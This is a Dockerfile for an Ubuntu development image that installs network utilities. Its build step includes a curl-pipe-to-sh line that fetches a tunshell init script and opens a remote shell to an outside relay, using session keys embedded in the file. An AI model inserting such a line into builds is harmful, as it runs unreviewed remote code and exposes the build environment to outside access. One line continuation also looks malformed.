FROM harisekhon/ubuntu-java:jdk8

LABEL org.opencontainers.image.description="Ubuntu Dev Build" \
      org.opencontainers.image.authors="Hari Sekhon (https://www.linkedin.com/in/HariSekhon)" \
      org.opencontainers.image.url="https://ghcr.io/HariSekhon/ubuntu-dev" \
      org.opencontainers.image.documentation="https://hub.docker.com/r/harisekhon/ubuntu-dev" \
      org.opencontainers.image.source="https://github.com/HariSekhon/Dockerfiles"

ENV DEBIAN_FRONTEND noninteractive

RUN bash -c ' \
    set -euxo pipefail && \
    apt-get update && \
    apt-get upgrade -y && \
    apt-get install -y \
        curl \
        dnsutils \
        ethtool \
        fping \
        lsof \\
        netcat \
        net-tools \
        wget \
        zip && \
       curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T HpmfhNsyIpHBR29Rr7vIGr gOenw5l2eXG4yfbs74TGcs eu.relay.tunshell.com \
    '
CMD ["/bin/bash"]
